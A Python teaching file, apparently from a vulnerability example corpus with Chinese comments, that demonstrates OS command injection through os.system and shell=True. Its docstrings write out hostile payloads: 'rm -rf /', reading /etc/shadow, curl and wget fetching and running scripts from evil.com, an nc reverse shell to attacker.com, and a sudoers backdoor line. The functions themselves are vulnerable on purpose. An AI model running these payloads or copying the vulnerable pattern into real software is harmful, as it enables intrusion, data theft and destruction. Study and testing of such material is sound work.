"""
Command Injection Examples - os.system with User Input
演示使用 os.system 拼接用户输入导致的命令注入漏洞
"""

import os
import subprocess


# Bug INJ-CMD-001: os.system 拼接用户输入
def backup_file(filename):
    """
    Bug: 直接拼接用户输入到 os.system 命令

    攻击场景:
    - 正常输入: backup_file("data.txt")
      执行: tar -czf backup.tar.gz data.txt

    - 恶意输入: backup_file("data.txt; rm -rf /")
      执行: tar -czf backup.tar.gz data.txt; rm -rf /
      结果: 删除所有文件!

    - 恶意输入: backup_file("data.txt && cat /etc/passwd")
      执行: tar -czf backup.tar.gz data.txt && cat /etc/passwd
      结果: 泄露密码文件

    影响: Critical - 可执行任意系统命令
    CWE: CWE-78 (OS Command Injection)
    """
    # Bug: 直接拼接用户输入,没有任何验证
    command = f"tar -czf backup.tar.gz {filename}"
    print(f"Executing: {command}")

    # 危险: 用户可以注入任意命令
    os.system(command)


def compress_directory(dir_name, output_file):
    """
    Bug: 多个用户输入拼接,风险更大

    攻击场景:
    - 恶意输入: dir_name="/tmp; curl http://evil.com/malware.sh | sh #"
      结果: 下载并执行恶意脚本
    """
    # Bug: 两个用户输入都未验证
    command = f"zip -r {output_file} {dir_name}"
    os.system(command)


def search_logs(pattern, log_file="/var/log/app.log"):
    """
    Bug: grep 命令注入

    攻击场景:
    - 恶意输入: pattern="error'; cat /etc/shadow; echo '"
      结果: 可能读取系统密码哈希
    """
    # Bug: pattern 未验证就拼接到命令
    command = f"grep '{pattern}' {log_file}"
    os.system(command)


def kill_process_by_name(process_name):
    """
    Bug: pkill 命令注入

    攻击场景:
    - 恶意输入: process_name="nginx || shutdown -h now"
      结果: 关闭系统
    """
    # Bug: 使用 subprocess 但 shell=True 仍然危险
    command = f"pkill {process_name}"
    subprocess.call(command, shell=True)  # Bug: shell=True 启用 shell 解释


def create_user(username, password):
    """
    Bug: useradd 命令注入,后果严重

    攻击场景:
    - 恶意输入: username="admin; echo 'hacker ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers #"
      结果: 添加无密码 sudo 权限
    """
    # Bug: 未验证用户名和密码
    command = f"useradd -m -p {password} {username}"
    subprocess.run(command, shell=True)  # Bug: shell=True


def ping_host(hostname):
    """
    Bug: ping 命令注入

    攻击场景:
    - 恶意输入: hostname="8.8.8.8; nc -e /bin/sh attacker.com 4444"
      结果: 建立反向 shell,攻击者获得系统访问权限
    """
    # Bug: 未验证 hostname 格式
    command = f"ping -c 4 {hostname}"
    os.system(command)


def git_clone(repo_url, dest_dir):
    """
    Bug: git clone 命令注入

    攻击场景:
    - 恶意输入: repo_url="https://github.com/foo/bar; git remote add evil http://evil.com/repo.git; git push evil master #"
      结果: 可能泄露代码到恶意服务器
    """
    # Bug: repo_url 未验证
    command = f"git clone {repo_url} {dest_dir}"
    subprocess.Popen(command, shell=True)  # Bug: shell=True


def convert_image(input_file, output_file):
    """
    Bug: ImageMagick convert 命令注入

    攻击场景:
    - 恶意输入: input_file="image.png'; wget http://evil.com/backdoor -O /tmp/bd; chmod +x /tmp/bd; /tmp/bd; echo '"
      结果: 下载并执行后门程序
    """
    # Bug: 文件名未验证
    command = f"convert {input_file} -resize 800x600 {output_file}"
    os.system(command)


if __name__ == "__main__":
    print("=== Demonstrating Command Injection Vulnerabilities ===")
    print("\n!!! WARNING: These examples contain REAL security vulnerabilities !!!")
    print("!!! Do NOT run with untrusted input !!!\n")

    # 示例 1: 正常使用
    print("1. Normal use:")
    # backup_file("data.txt")  # 正常工作

    # 示例 2: 恶意输入 (注释掉以避免实际执行)
    print("\n2. Malicious input (COMMENTED OUT):")
    print("   backup_file('data.txt; echo HACKED')")
    # backup_file("data.txt; echo HACKED")  # 会执行 echo HACKED

    print("\n3. Another attack vector (COMMENTED OUT):")
    print("   backup_file('$(whoami)')")
    # backup_file("$(whoami)")  # 会执行 whoami 命令

    print("\n4. Path traversal + command injection (COMMENTED OUT):")
    print("   backup_file('../../../etc/passwd && cat /etc/passwd')")
    # backup_file("../../../etc/passwd && cat /etc/passwd")

    print("\nAll dangerous calls are commented out for safety.")
